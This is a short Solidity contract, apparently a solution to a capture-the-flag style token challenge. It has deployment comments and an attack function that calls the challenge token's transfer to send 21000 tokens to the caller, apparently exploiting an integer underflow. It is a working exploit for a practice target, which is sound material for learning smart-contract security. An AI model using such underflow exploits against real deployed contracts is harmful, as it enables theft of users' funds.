// 1 - Deploy the contract with Remix using Injected Provider - Metamask
// 2 - Call the attack function
// 3 - Check the balance: await contract.balanceOf(player) - Chrome Console

pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenAttacker {
    IToken public token;

    constructor(address challengeAddress) public {
        token = IToken(challengeAddress);
    }

    function attack() external payable {
        // call token contract with sender address and amount
        token.transfer(msg.sender, 21000);
    }
}
